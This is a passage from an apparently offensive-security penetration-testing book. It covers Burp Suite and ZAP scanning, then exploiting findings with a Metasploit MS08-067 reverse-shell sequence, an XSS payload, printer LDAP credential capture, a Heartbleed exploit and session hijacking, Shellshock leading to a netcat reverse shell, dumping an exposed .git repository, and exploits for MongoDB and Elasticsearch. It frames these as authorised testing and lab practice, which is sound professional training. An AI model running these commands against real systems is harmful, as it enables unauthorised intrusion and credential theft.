listening on port 8080. Go to the Proxy tab in Burp, then to Options, and make sure that Burp is
running. It doesn't matter which interface port you use, however, if you change it from the default,
make sure to change it in your browser's configuration.
Enabling Burp Suite
Now, we need to configure your browser so that it can use the port on which we had Burp Proxy
listening. The add-on that I use is called Foxy Proxy for Firefox:
(https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/)
And it should have been installed in the setup phase. It provides an easy way to have multiple proxies
and be able to change between them quickly. Right next to the browser's URL bar, there is a fox with
a circle and line across it. Click on the fox, click Add New Proxy, click the Proxy Details tab, and set
the Manual Proxy Configuration to the local host (127.0.0.1) and the proxy port of 8080. Go back to
the General tab, give that proxy a name, and save that configuration.
What you have essentially done is told your browser to send all the traffic to your local host to port
8080. This is the port on which we have configured the Burp Suite application to listen. Burp knows
that it will take this traffic and proxy it out to the Internet.
Configuring the Browser‚Äôs Proxy Settings
Since you have saved this profile, right-click on the fox and drop down to select your proxy
configuration. In this case, I named my proxy configuration Burp Suite and selected that as my proxy.
Selecting the Proxy to Utilize
Once we have our browser using the proxy, we can browse to the web application we identified
earlier. In this example, I am going to go to my site in my browser: www.securepla.net. If we go back
to Burp, we are going to see the Proxy/Intercept tab light up.
Burp Capture and Intercepting Traffic
If we see this happen, we know we have configured everything perfectly. We see that Burp
successfully captured the GET request for my website and we can also see any cookies and other
requested information. By default, the initial state is to intercept all traffic. Intercept means to stop
any requests from the browser to the web application, give you the ability to read or modify that
request, and either forward that request to the web application or drop that request.
If you try to browse to any sites with the default setting, you won't be able to see any responses until
you turn off the "Intercept" button. By turning the "Intercept" button off, we will still be capturing all
the web traffic, but we won't be directly tampering with every request. Once in an ‚ÄúIntercept-off‚Äù
state, you can see all the requests and responses within the History tab to the right of the Intercept.
Now, if we go to the Target tab, we can see the URL that we had just trapped and forwarded. Let's
first add this site to our Scope. Scope defines where automated spidering and testing could occur and
helps prevent you from actively scanning domains that are out of your scope. We will go into this a
little bit later, but you should add all the URLs or FQDNs you want to test to your scope. The image
below shows the tester right-clicking on the domain and clicking on "Add to scope."
Creating Your Scope
Spider Application
The first thing to do for web application testing is to spider the host. This means that Burp will crawl
through the whole website and record all the different files, forms, and HTTP methods on that site.
We spider first because we need to identify where all the links are, what types of parameters are used
in the application, what external sites the application references to, and the overall layout of how the
application functions.
To spider your application, drop into the Target tab, the Site map tab, right-click the domain on which
you want to spider, and click "Spider this host."
Spidering the Host
Once the spidering process is complete, Burp should have a good layout of what the application looks
like. We can also click on any file (image below) to see what the request and the response were. In
the left-hand column, we see all of the files and folders, and on the right-hand side, we see the
requests and responses. Right below the Site map tab is the Filter button. Try playing around with this
to see what you are filtering out and what works for you. Generally, I like to first add all my domains
to scope and then click the Filter to only show those that are in scope. It ends up cleaning up a lot of
referenced domains, which are out of scope on my tests anyway.
Site Map/Request and Responses
Discover Content
There are times where pages or folders are not directly linked from a web application. For example, I
have often seen that the admin folder or login page are not referenced anywhere on the site. You might
see that when you go to the /admin/ folder in your browser bar, you are taken to the admin
authentication page, but this might have been missed during the spidering phase. This is usually
because host administrators are trying to hide these folders and administrative login pages fromgeneral users. These are the exact types of things you are looking for in a test, so that you can try to
bypass or brute-force the authentication process.
There is a specific module within Burp that is extremely helpful in these scenarios. Within the same
Site map tab, you right-click on the parent URL, drop down to "Engagement tools," and click on
"Discover content."
Discover Content
Once inside the Discovery module, you can click on the "Session is not running" button and the
application will start "smart brute forcing" folders and file structures. When I say, "smart brute
forcing," I mean the application learns from files and folders it finds within the application and tries
to make better choices for brute forcing. This technique provides an efficient process to identify
folders and files to further your application testing.
Before I show the example, note that there are custom wordlists that I prefer to use during my own
assessments. One of these lists comes from a tool called RAFT that is no longer developed.
These lists can be found here: http://code.google.com/p/raft/source/browse/trunk/data/wordlists/?
r=64
Discovering Session Status
As you can see in the image above, the Discovery tool identified the /wp-includes/ folder which is
common to WordPress applications. It then starts looking for common folder/files types within that
folder. You can click on the Site map tab at the top of the Discovery module and see all the results
from that scan. This will help to quickly identify hidden folders, admin pages, configuration pages,
and other pages that will prove useful to a tester.
Running the Active Scanner
Once you feel comfortable that you have identified an adequate portion of the site, you can start
attacking the parameters, requests, and start looking for vulnerabilities. This can be done by rightclicking on the parent domain and dropping down to "Actively scan this host" (image below). This
will kick off Burp's application scanner and start fuzzing input parameters. Remember, this is going to
be extremely loud on the network and may submit extensive queries in the application. A quick
warning, if the application has a comment box, the customer might receive an excessive amount of
emails from all the parameters being actively fuzzed. This is why it is always important to let your
customer know when and from where the tester will be performing these tasks.
Active Vulnerability Scans
Once the scanner is running, the results and testing queue will be located in the "Scanner" tab. You
might want to look at the Options tab within the Scanner tab to further configure Burp Suite. One
change that I generally make to decrease scan times is to increase the number of threads in the Active
Scan Engine section. This will make a significant difference in the amount of time that is required, but
be careful, as you might take down a small site if the thread count is too high.
If we take a look at the results, we see that Burp Suite found an XSS vulnerability for this website.
Burp told us exactly what the issue was, the request to repeat it, and the response.
Scan Results
Being a penetration tester, you need to verify that you do not have any false positives and identify the
actual severity of the finding. Let's see if what Burp had found was actually valid. Clicking on one of
the XSS vulnerabilities, we can see the exact GET parameter that was used. To replicate this issue,
we would have to go and visit:
www.securepla.net/xss_example/example.php?alert=9228a<script>alert(1)</script>281717daa8d.
Opening a browser and entering the URL, the following demonstrates that this is not a false positive,
but a real vulnerability. If you aren't familiar with XSS attacks, I would spend some time playing with
a vulnerable web application framework like WebGoat:
https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project.
XSS Example
Burp will do a lot more than just check for XSS vulnerabilities. It can identify CSRF issues, bad SSL
certs, directory traversal vulnerabilities, SQLinjections, command injections, and much more. To see
more uses of Burp, go to the section in this book about The Throw - Web Application Pentesting.
OWASP Zap Proxy
(https://code.google.com/p/zaproxy/)(Kali Linux/Windows/OS X)
The equivalent to Burp Pro Proxy on the open source side is called OWASP Zed Attack Proxy or
ZAP. Although Burp is a commercial tool, ZAP has many of the same features. From proxying traffic,
fuzzing requests, spidering and automated scanning, ZAP does it all. In Windows/OS X, you can just
double-click on the OWASP ZAP executable and you can run it on Kali with owasp-zap.
We are going to test against one of the vulnerable frameworks on OWASPBWA (which we installed
in the setup phase of the book). In this case we will be testing against the owaspbricks application.
Once you start up ZAP, you will be presented with the image below. The straightforward attack is to
just put in the URLhttp://[IP of VM]/owaspbricks/ and hit Attack. ZAP will automatically run through
the spidering and testing for web vulnerabilities.
OWASP ZAP
As you can see, everything is pretty straightforward. Once the scan is finished, click on the Alerts tab
to see all the vulnerabilities that are identified.
OWASP ZAP ‚Äì Results
Scanning with multiple web applications scanners is just as important as scanning with both Nessus
and Nexpose for network-based vulnerabilities. Here is a side-by-side comparison of scanning the
same application. As we can see, we have found completely different vulnerabilities, vulnerability
locations, and different types of findings between ZAP on the left and Burp on the right. We can
instantly identify that our scanners have much different results.
OWASP ZAP VS Burp
The one question that I often get is: Which is better?‚Äù The answer is that it always depends. The best
answer would be to use both. They both do a lot of the same things, but have benefits in their specific
areas. The security community does lean more on the Burp Proxy Pro because it supports Burp
Extender (http://portswigger.net/burp/extender/), which you can use to create customized scan tools.
You might have an application that does some processing of cookies or that requires a multi-step
processes before fuzzing a certain parameter. This is where Burp has exceeded well and you can read
more about this here:
http://blog.opensecurityresearch.com/2014/03/extending-burp.html.
Parsing Nessus, Nmap, Burp
One of the biggest problems for any tester is that the outputs from many of the different tools can make
them hard to use. Lee Baird has included a great parsing tool in his Discover toolset. It standardizes
all the ports, services, findings, and associated information into an easily usable CSV format.
‚óè cd /opt/discover
‚óè ./discover.sh
‚óã 12. Parse XML
‚óã 2. Nessus (.nessus format)
Discover Parsing
The output saves to a csv file under /home/data. The image below shows both a Nessus and Nmap
output. This makes it much easier to quickly identify systems, services, and vulnerabilities.
Discover Results
Burp takes a couple more steps. On the Scanner/Results Tab, right-click on the URL you scanned and
click ‚ÄúReport Selected Issues.‚Äù You will be prompted with a reporting wizard and select XML and
deselect Base64-encoded requests/responses.
Discover Burp Logs
And the output is a well-formatted CSV file with all your findings! This can make it quick for
reporting, and quickly identifies what you are going to attack next.
Discover Burp CSV
Summary
Scanning the network is an important step for a successful network-wide penetration test. With such a
large scope, both passive and active scanning can provide information about the network, services,
applications, vulnerabilities, and hosts. Using specialized or customized port scans, web scraping,
"smart brute forcing," and automated tools can help you increase the efficiency and the effectiveness
of the test. These findings will directly lead into the next few sections on exploiting vulnerabilities
identified by this process.
The Drive - Exploiting Scanner Findings
You were able to successfully complete your last mission of OSINT and scanning without being
caught. The next phase of your mission is to take everything that you have gathered and learned to
identify weaknesses and exploit them for fun and profit.
As with the first THP book, The Drive section takes results from the prior phases and exploits themfor an initial foothold into the company. Some findings might have exploits available through the
Metasploit framework, some you might have to find on exploit forums, and some just take experience
and knowledge to take advantage of misconfigurations.
Using you use Nexpose or Nessus (or any other vulnerability scanner), might not make a difference
for the exploiting process. Once a scanner finds a vulnerability, I will usually go and search for a
working exploit. I have dedicated a section in the later chapters about Vulnerability Searching and
how to find exploits based on findings from a scanner, but for now, I will briefly describe how to use
Metasploit, the importance of understanding scripts to exploit your vulnerabilities, and common
vulnerability misconfigurations.
Metasploit
(http://www.metasploit.com) (Windows/Kali Linux)
Before we can get into exploiting scanner findings, we need to quickly go over Metasploit again. The
Metasploit Framework is designed for developing, exploiting, and assisting in attacks. The best part
of the framework is that it was developed with research in mind. By this, I mean that it is very easy to
develop your own Metasploit modules and utilize them within the framework. It doesn‚Äôt take a lot of
Ruby knowledge, but it requires only basic scripting skills. Without spending too much time
explaining Metasploit, let‚Äôs walk through an example using the framework. Remember that this book
is geared to those that have some Metasploit experience. If you are pretty new to Metasploit, you
should spend a fair chunk of time learning the basics of this tool.
Here are a few helpful tips before we start with Metasploit. You should refer back to these tips while
you are using Metasploit during your first few times; after that you should be good on your own.
From A Terminal In Kali - Initialize And Start Metasploit:
‚óè Start PostgreSQL
‚óã service postgresql start
‚óè Start PostegreSQL on Bootup
‚óã update-rc.d postgresql enable
‚óè Start and stop the Metasploit service (this will setup your database.yml file for you)
‚óã service metasploit start
‚óã msfconsole
‚óã exit
‚óã service metasploit stop
‚óè Log everything to /root/msf_console.log at a command prompt:
‚óã echo "spool /root/msf_console.log" > /root/.msf4/msfconsole.rc
‚óè Start Metasploit Command Line
‚óã Msfconsole
Running Metasploit - Common Configuration Commands:
‚óè help: Use help as much as you can!
‚óè search [string]: Search for vulnerability by CVE, title, application, etc.
‚óè use [module]: select module
‚óè info: get information once a module is selected
‚óè show options: show the requirements for the module
‚óè set and setg: Set the variables from show options. You can use setg for Global
Variables. If you are jumping between modules and exploits and you don‚Äôt want to
type in the IP address (or other input) every time, use setg instead of set
‚óè If you are using a remote exploit, you might not see the PAYLOAD as a choice
inside show options, but you can always set it with: set PAYLOAD [hit tab a couple
times to see the choices]
‚óè To set custom payloads: set EXE::Custom [file]
‚óè exploit -j: active module to the background any connections to the listening handler
Running Metasploit - Post Exploitation And Other
‚óè sessions -K: Kill all sessions
‚óè background: From a Meterpreter shell, go back into the main menu, but keep your
current session established in the background
‚óè Resource file scripts to automate your handler (more info at the tips and tricks
section of the book): msfconsole -r resource.rc
‚óè http://www.cheatography.com/huntereight/cheat-sheets/metasploit-4-5-0-dev15713/
‚óè http://www.offensive-security.com/metasploit-unleashed/Msfconsole_Commands
The best method is to learn through example. I know that the MS08-067 vulnerability is pretty old, but
I still find these vulnerabilities every so often and the attack is extremely stable compared to other
remote attacks. For those who have never used or exploited the MS08-067 vulnerability, I
recommend setting up a lab with an old unpatched Windows XP system and trying this exact example.
If you are an expert MS08-067'er, you can skip this short section.
Using Metasploit For MS08-067:
‚óè Dropping into Metasploit on Kali:
‚óã Open up a terminal and type: msfconsole
‚óè To search for a vulnerability, type:
‚óã search ms08-067
‚óè Select the exploit from the search results, type:
‚óã use exploit/windows/smb/ms08_067_netapi
‚óè See options required for the exploit to work, type:
‚óã show options
‚óè Set IP information, type:
‚óã set RHOST [IP of vulnerable Windows host]
‚óã set LHOST [IP of your machine]
‚óè Select which payloads (to get a better understanding of the types of payloads
review: http://www.offensive-security.com/metasploit-unleashed/Payload_Types)
and encoder to use, type:
‚óã set PAYLOAD windows/meterpreter/reverse_tcp
‚óã set ENCODER x86/shikata_ga_nai
‚óè Run the attack, type:
‚óã exploit
Metasploit
These are the basics of Metasploit and we will build off these really quickly. Make sure you spend
time exploiting Windows and Linux machines before trying any attacks in the wild.
Scripts
There were countless times where I found exploits for vulnerabilities that were not in Metasploit.
Usually, when searching for vulnerabilities based on version numbers from the banner-grabbing
script, I will find exploits in other places (see Special Teams - Cracking Exploits and Tricks
section). A lot of the time, the scripts/codes will be written in Python, C++, Ruby, Perl, Bash, or
some other type of scripting language.
Note that as a penetration tester, you need to be familiar with how to edit, modify, execute, and
understand the scripts/codes regardless of the language and be able to understand why an exploit
works. I don't recommend you ever execute a script without testing it first. I have honestly seen a few
scripts on forums and Exploit-DB where the shellcode payload actually causes harm to the intended
system. After the script exploits the vulnerability, the payload deletes everything on the vulnerable
host. I am pretty sure that your client would not be too happy if everything on his host system was
wiped clean. This is why you should always either use your own shellcode or validate the shellcode
that is within the script.
WarFTP Example
Let's say you find a vulnerable version of WarFTP server running and you find some code (for
example: http://downloads.securityfocus.com/vulnerabilities/exploits/22944.py) on the Internet.
Things you may need to understand:
‚óè How do you run the exploit? What language is it? Do you need to compile it or are
there any libraries you need to import?
‚óè Are there any dependencies required for the exploit to work? Version of Windows
or Linux? DEP or ASLR?
‚óè Are the EIP addresses or any other registers or padding values hardcoded to
specific versions? Do they need to be modified?
‚óè Will the exploit take down the service? Do you only have one chance at
compromising the host? This is very important as you might need to work with the
client or test a similar infrastructure environment.
Here is an example of what your script could look like and, if run properly, could allow shell access
on the victim server.
Example Exploit
Even with MS08-067, the exploit is Operating System and service pack dependent. Luckily with that
payload, it tries to identify the proper OS before exploiting the host. A lot of the exploits that are
written in scripting languages do not take these into account and are developed for a single OS type.
This is why you will often see that the exploit will contain information about the system on which it
was tested. Even within the same Operating System, something like the Language of the OS can cause
an exploit to fail or cause a denial of service. For example, the following PCMAN FTP buffer
overflow exploit was only tested on the French version of Windows 7 SP1. This does not guarantee
that this exploit will be successful on the English version.
FTP Exploit Example Script
This is why I recommend you understand and test all of your exploits before you try them on any
production host and make modifications to scripts as necessary.
Printers
It often happens that we overlook low-level findings, but there are many times where we can go fromlow to owning the network. One of my favorite examples is with printers. We all come across a ton of
multi-function printers (MFP) on our engagements and, in the past, have overlooked them. What if
these MFP devices could lead to a compromise on the network?
You jump on a network and currently don‚Äôt have any credentials. You might want to start small and
scan only your current subnet in hopes as not to alert any IDS sensors. In doing so, you come across a
multi-function printer.
Maybe your scanner picks up default credentials or you guess the password from reading
documentation.{5} Moreover, perhaps you come across an unpatched printer and use an exploit in
your printer exploitation folder‚Äìcheck out the /opt/praedasploit
(https://github.com/MooseDojo/praedasploit) folder. Once in the administrative console, you poke
around and nothing really of value is there, or is there? You notice that these enterprise multi-function
printers have the capability to query the domain to find email addresses via LDAP. This means when
you are physically on the printer using the little LCD screen, when scanning a document, you have to
internally find the sender‚Äôs email address based on their name. What if you could pull the password
from the user account that it used to bind to the LDAP server to run the queries?{6}
We first log into our Xerox MFP with the default credentials over HTTP. Like I said before, I am
sure we see this pretty much on every penetration test.
Default Multifunction Printer
A quick Google search (or maybe your scanner identifies the default password) and you know that the
admin password is 1111. Going to the ‚ÄúProperties‚Äù tab, we can see that this printer is configured with
LDAP to query the domain.
Multifunction Printer - LDAP setting
Looking at the configuration, we need to modify the LDAP server so that it points to our Kali attack
VM. This way, any LDAP lookups will be directed to our LDAP server instead of the corporate
LDAP server.
We see in the username, that it currently uses a domain account and although the password field is
blank, we can still make changes without re-entering the password information. We go ahead and
save our configuration changes.
Multifunction Printer - LDAP Modification
Now, we just need to wait until the MFP creates an LDAP lookup and we should be able to capture
the credentials. Luckily, in the case of Xerox (and many other printers), they have a feature to test
your LDAP queries.
We can click the "User Mappings‚Äù tab and test a user lookup.
MFP - LDAP Check
Remember that we are now pointing the LDAP server to our Kali Linux box. Before testing an
account, we need to set up a netcat listener on the specified server we set in the configuration page
above. We start a quick listener on port 444 (or whatever port you configured) and go back into the
management console, and hit the ‚Äúsearch user‚Äù button.
MFP - Capturing LDAP Credentials
Looking at our netcat output, we now see that the MFP, which is connected to our Kali netcat listener
via LDAP, tried to authenticate using a Domain_Admin_Account and a password of
‚Äú$uper$ecretPass!‚Äù.
In most cases, you might not come across a domain admin account, but you will have your first
account to move laterally through the network.
Heartbleed
Heartbleed is one of those buzzword security vulnerabilities that blew up in 2014. Unfortunately for
network administrators and system owners, this vulnerability was one of the worst issues of that year.
The Heartbleed bug was a vulnerability in OpenSSL that allowed an attacker to read parts of the
server‚Äôs memory. So what does this really mean? You can ask a server that uses SSL security for
encryption to perform a request and, in addition, give you some allocated chunk of memory back. For
an easier visual reference, visit this xkcd article: http://xkcd.com/1354/. From the xkcd comic strip,
you ask for a word to be returned (example: dog), but ask for the size to be returned as 500 bytes
instead of the normal 3 bytes. The server will return the word ‚Äúdog‚Äù back to you, and in the process,
you will also receive any other memory that might have been allocated in previous requests.
We don‚Äôt know exactly how many systems were vulnerable, but zmap.io did a scan of the Alexa Top
1 Million domains as of April 16, 2014 and reported which domains were vulnerable at the time.
Supposedly, reports have stated that even today some of the domains are vulnerable. See
https://zmap.io/heartbleed/vulnerable.html.
The scary part was what was found in the memory space. From numerous penetration tests, we found
passwords, usernames, random strings, emails, session keys, and even private SSL certificates. With
private SSL certificates, we can now decrypt any traffic that we sniff.
So let‚Äôs walk through one example. Although there are numerous tools (a Metasploit module is
available) to pull memory from vulnerable OpenSSL services, we are going to compile our own:
‚óè cd /opt/
‚óè wget
https://raw.githubusercontent.com/HackerFantastic/Public/master/exploits/heartbleed.c‚óè gcc heartbleed.c -o heartbleed -Wl,-Bstatic -lssl -Wl,-Bdynamic -lssl3 -lcrypto
‚óè chmod +x heartbleed
We should have a heartbleed binary to execute against a vulnerable service. The most common way
to exploit heartbleed was via HTTPS, but it is not the only way. One more interesting example that I
have seen in multiple environments is from OpenLDAP using OpenSSL. We all know that LDAP is
the authentication and authorization source for many different companies and being able to pull out
sensitive data could be detrimental.
From our vulnerability scanner output, we see that 192.168.100.101 is vulnerable to Heartbleed.
Let‚Äôs take the binary we just compiled and execute it against that host:
‚óè ./heartbleed -s [IP] -p [port] -f [output file] -v [verbose] -t [type]
‚óè example below: ./heartbleed -s 192.168.100.101 -p 636 -f output_ldap -v -t 1
Heartbleed check
What might we see in the output_ldap file? If you look closely, we see a SSHA {SSHA} hash. We
could take that into oclHashcat and crack it. In the same dump, we could have also seen user
accounts, organizational structure, and private SSL certificates as well. We could have made a copy
of the private SSL certificate and sniffed all the traffic to that LDAP server. This could mean that we
would have every user‚Äôs account that authenticated against this LDAP server.
Heartbleed - LDAP Memory Disclosure
Now, we know there are tons of different Web and LDAP servers that were vulnerable, but these
aren‚Äôt the only juicy sources of Heartbleed data. One of the largest issues and attacks seen with
Heartbleed was that it affected SSL VPNs. Imagine for a second that you could read the server‚Äôs
memory on a VPN server. What would be the impact if you could see username and passwords? In
theory, you would have direct access as any user that was logged in at that time. What if the
vulnerability was after-hours? Whose account might you compromise? In the case of Heartbleed, as
many IT administrators VPN‚Äôed in during the rush to patch systems, they could have been getting
compromised at the same time.
Let‚Äôs take a look at the Juniper SSL VPNs that were vulnerable to this bug. Running the same
command as before, we query the SSL VPN web server to return what is stored in the designated
memory space. A result would look like the following:
Heartbleed - SSL VPN
In this case, the client even had two-factor authentication, but remember how two-factor works with
SSL VPNs. Once you authenticate with both username/password and token (second factor), you get
back a web session ID. If you capture just the web session ID, you can impersonate this user now
(without the second factor) by taking their session ID and importing it into your own browser. For
example, we see in the heartbleed memory dump a cookie called DSID. What is the DSID?
‚ÄúThe SA issues an HTTP cookie to authenticate a user session (DSID), which is shared by client
components (that is, NC/WSAM/Pulse) and the browser. Generally, browsers do not store cookies in
any secure manner; so it is relatively easy for an attacker to obtain the DSID cookie and gain access
to an SA session.‚Äù{7}
This is the user‚Äôs session cookie! If we grab this cookie and create this cookie in our browser, we
become this user. So let‚Äôs open up Firefox, access the VPN server, select Cookies from the Web
Developer tab, and view Cookie Information.
Heartbleed - Adding a Cookie
You might already see two different cookies or the DSID cookie might even be missing. Just add it in
with the DSID value you obtained from the Heartbleed bug and reload that page.
Heartbleed - Adding the DSID Cookie
From recent assessments, I don‚Äôt really see Heartbleed publicly accessible as when it first came out,
but I still find it often on internal engagements.
Shellshock
Shellshock was the second huge vulnerability in 2014 that caused a multitude of systems to get
infected all over the Internet.{8} Shellshock was a vulnerability that allowed remote code execution
due to the fact that Bash has rules for handling the string ‚Äú() { :; };‚Äù. The vulnerability relied on how
the system would parse environment strings. Although this didn‚Äôt solely affect CGI, due to the fact that
Bash can parse CGI scripts, this vulnerability is easily attackable. The first part of the exploit string,
which is really just an environment variable function definition followed by a semi-colon, is written
as ‚Äú() { :; };‚Äù. Regardless of what the function definition contains, all we care about is the value we
inject after the trailing semicolon, which will be parsed and executed by vulnerable versions of Bash.
Shellshock Lab
This sounds complex, but the best way to demonstrate shellshock is through an example. This will
give you a good understanding of how it works. The OWASPBWA vulnerable web application
virtual machine is vulnerable to the Bash exploit, so make sure you have it running. Log into that VMimage and copy the vulnerable cgi file listed below first.
On the OWASPBWA VM Image from a Terminal:
‚óè wget --no-check-certificate
https://raw.githubusercontent.com/cheetz/icmpshock/master/test.cgi -O /usr/lib/cgibin/test.cgi
‚óè chmod +x /usr/lib/cgi-bin/test.cgi
‚óè Find the IP of the vulnerable host (ifconfig)
This will write a shell script to the cgi-bin folder that we need to use to execute the vulnerability.
Remember for something like Shellshock to work, it needs to have a bash file in the cgi-bin folder.
You can access it by going to a browser and inputting http://[IP of vulnerable host]/cgi-bin/test.cgi. If
everything worked, you should see a page that just says ‚Äúhi‚Äù.
Going back to our attacking Kali host, we are going to use a tool I created called icmpshock.py (note
that there is also a Metasploit module, so try them all). The reason I created this script is because I
wanted the tool to brute-force through all common cgi type files at an amazing speed and test all the
common HTTP header information (User Agent, Cookie, Host, Refer) with ShellShock. As long as
you have a pretty big pipe, you can take advantage of Python‚Äôs threading to brute-force through all cgi
files/directories in just seconds. Remember that we are going for quick and efficient to try to pop as
many boxes as possible.
Now, we go back to our attacking VM host, which you have already configured at the beginning of the
book, and go to:
‚óè cd /opt/icmpshock/
‚óè chmod +x icmpshock.py
‚óè gedit target_list.txt and add the vulnerable server's IP
‚óè Start Up tcpdump to listen for ICMP in a new terminal window.
‚óã tcpdump -nni eth0 -e icmp[icmptype] == 8
‚óè ./icmpshock.py [Listener IP of the Kali Host] target_list.txt
This script will brute-force through many different common cgi paths and filenames. If it successfully
identifies a file and that file is a shell script, it will inject the shell shock exploit to force the systemto ping back to our victim host. This shows that the victim is not only vulnerable, but that we also
have command execution.
This is why we set tcpdump to listen to ICMP requests. In the example below, the icmpshock.py
script is going through its list of cgi location/files and when it hits cgi-bin/test.cgi, it causes the victimhost to ping our attacker box.
ICMPShock Exploit
We now know we have command execution and can go back to our script to change the ‚ÄúCommand‚Äù
variable to run whatever shell command we want:
‚óè gedit icmpshock.py
We won‚Äôt get into post exploitation in this section, but the easiest thing to do would be to spawn a
reverse netcat listener up. Let‚Äôs uncomment the code with the bin/nc command and comment the
original ping comment.
ICMPShock - Enabling a Netcat Listener
After making modifications to the code, we need to open a new terminal window and set up a listener
(instead of the ICMP tcpdump setting configured in the prior example) on the attacking host:
‚óè nc -l -p 4444
Run the icmpshock.py tool again and you should get a connection back. To test, we can run a quick
‚Äúlist directory contents‚Äù command (ls) and we should see the files in that directory.
ICMPShock - Exploit
We have a full shell on all the vulnerable shellshock systems. We aren‚Äôt limited to only web-based
shellshock exploits either, as you can see below:
‚óè SSH:
‚óã http://resources.infosecinstitute.com/practical-shellshock-
exploitation-part-2/
‚óè DHCP:
‚óã https://github.com/rapid7/metasploitframework/blob/master/modules/exploits/unix/dhcp/bash_environment.r‚óè OSX/VMware:
‚óã https://github.com/rapid7/metasploitframework/blob/master/modules/exploits/osx/local/vmware_bash_funct‚óè OpenVPN:
‚óã http://www.darknet.org.uk/2014/10/openvpn-vulnerable-toshellshock-exploit/
Dumping Git Repositories (Kali Linux)
It is becoming a very common practice for web developers to implement revision control systems for
their code base. Different examples of these tools are Git, Bazaar, Mercurial and Subversion, but they
all work relatively the same. A common mistake seen throughout many development environments is
that developers tend to leave their repositories (repo) publicly accessible.{9}{10}
As a penetration tester, once a repository is identified via a web scanner, the common techniques is to
clone the repository, look for sensitive information in different commits, and restore older versions of
the applications. As seen in our next example, Git repositories are usually found in a .git directory
(example: 10.10.10.10/.git/).
Vulnerable Git Repository
We can clone the whole remote Git repository onto our Kali Linux host by running a recursive wget
command from the ./git root (we will assume 10.10.10.10 is the vulnerable server):
‚óè cd ~
‚óè wget -r http://10.10.10.10/.git/
‚óè cd 10.10.10.10
We now have the Git repository cloned onto our local computer and we can run a couple of Git
commands to pilfer for data. The first command to run is a status command. A status command shows
you the status of files in the index versus the working directory and can be run by:
‚óè git status
Git - Deleted Files
In the status output, we see that in the local revision, secret.php was deleted. To recover the deleted
change, we can run a git diff command which will generate patch files or statistics of differences
between paths or files in your git repository. To view the exact changes run the git diff
command{11}:
‚óè git diff
Git - Recovering Passwords
After running the diff command, we see that the Super secret password was removed. We can also
recover the whole file by running a command to pull all files from the last commit:
‚óè git reset --hard
These same types of techniques can be used to recover data from different types of repositories, but I
wanted to point out the wealth of data that can be obtained from bad practices and misconfiguration.
NoSQLmap
(www.nosqlmap.net/)(Kali Linux)
I will discuss NoSQLfurther below in the web exploitation section, but with the increasing growth of
NoSQLdatabases it is important to know how to interact with them. On numerous tests, scanners will
find open Mongo/Couch databases with no passwords. I might not have time during the test to go
through all the data in those databases, so this is where tools provide great value. If you want to
replicate this specific attack, go into the NoSQL Database Injections section and set up the vulnerable
Mongo database and associated web application.
Starting NoSQLmap:
‚óè cd /opt/NoSQLMap
‚óè python nosqlmap.py
‚óè 1 - Set Options
‚óã Set options for target host IP (your Mongo IP)
‚óã Set local MongoDB/Shell IP (your IP)
‚óã b - Save option file
‚óã x - to Exit
‚óè 2-NoSQL DB Access Attacks
Once the attack starts, you should see the following:
‚óè DB Access attacks (MongoDB)
‚óè =================
‚óè Checking to see if credentials are needed...
‚óè Successful access with no credentials!
‚óè MongoDB web management open at http://192.168.199.128:28017. No
authentication required!
‚óè Start tests for REST Interface (y/n)? y
‚óè REST interface not enabled.
‚óè 1-Get Server Version and Platform
‚óè 2-Enumerate Databases/Collections/Users
‚óè 3-Check for GridFS
‚óè 4-Clone a Database
‚óè 5-Launch Metasploit Exploit for Mongo < 2.2.4
‚óè 6-Return to Main Menu
‚óè Select an attack: 1
‚óè Server Info:
‚óè MongoDB Version: 2.0.6
‚óè Debugs enabled : False
‚óè Platform: 32 bit
‚óè Select an attack: 2
‚óè List of databases:
‚óè local
‚óè admin
‚óè users
‚óè appUserData
‚óè Select an attack: 4
‚óè Select a database to steal: 5
‚óè Does this database require credentials (y/n)? n
‚óè Database cloned. Copy another (y/n)? n
So, what we effectively did was copy the victim‚Äôs Mongo database to our local Mongo instance. We
can now copy all the databases we have and look at them at a later time for sensitive information.
How do we look at this data? In our example, we stole the database appUserData and cloned it. In
our local copy of Mongo, we will see a new database populated called appUserDataf_stolen. To
view it:
‚óè mongo
‚óè show dbs
‚óè use appUserData
‚óè show collections
‚óè db.users.find()
NoSQLMap - Cloning
If you spend some time looking at the power of NoSQLMap, you will also see that there are some
modules for exploitation. Within the tool, it also integrated a Metasploit exploit module for Mongo
systems below version 2.2.4.
Elastic Search (Kali Linux)
I will say this throughout the book: One of the most important things in becoming a penetration tester
is understanding a wide breadth of different technologies. Building a lab in your own environment
with all the different types of servers will help identify what you might run into in the real world. I
was on an engagement where the vulnerability scanners didn‚Äôt find any vulnerabilities for an Elastic
Search (ES) database. By default, ES has a web application running on port 9200 used for its search
API. It might have looked something like this:
Elastic Search - Vulnerable search service
After finding something like this, I instantly knew that 9200 was a port defaulted to Elastic Search,
and because I monitor security RSS feeds, I remembered that there was a recent vulnerability for it
(https://jordan-wright.github.io/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/).
Searching through exploit code, I was able to find one on Xiphos Research
(https://github.com/XiphosResearch/exploits/tree/master/ElasticSearch). I ran a quick wget on my
Kali host, connected via the exploit and had a root shell.
Elastic Search - Exploit
Elastic Search Lab:
If you want to build and test your own vulnerable Elastic Search service, you can install it with the
following:
‚óè update-java-alternatives --jre -s java-1.7.0-openjdk-i386
‚óè wget https://download.elasticsearch.org/elasticsearch/elasticsearch/elasticsearch1.4.1.zip
‚óè unzip elasticsearch-1.4.1.zip
‚óè cd elasticsearch-1.4.1/bin/
‚óè ./plugin -i elasticsearch/marvel/latest
‚óè ./elasticsearch
Once elasticsearch is running, you can download and execute your exploit code:
‚óè wget
https://raw.githubusercontent.com/XiphosResearch/exploits/master/ElasticSearch/elasti‚óè chmod +x ./elastic_shell.py
‚óè python ./elastic_shell.py localhost
And with that, you have compromised another database and obtained access onto a ton of different
hosts.
Summary
This is a baseline overview on taking the findings from the scanner results and putting them into
action. These examples will help lead into how to exploit systems in the upcoming chapters. Attacks
and exploits might not always work, which is why I stress that my readers avoid being tooldependent. It is more important to understand why an attack works and what the underlying issue is,
so that if a tool fails, you have the ability to modify and fix that exploit.
What helped me learn how to exploit computers was to take exploits from sites like
http://www.exploit-db.com/remote/ and recreate them in another high-level scripting language of my
choice. Developing these types of scripts and testing them against your own servers will help you
gain a much stronger background in coding and a better understanding for why vulnerabilities work. If
you are looking to dive deeper into exploit development, I recommend reading The Shellcoder's
Handbook:
http://amzn.to/19ZlgfE.
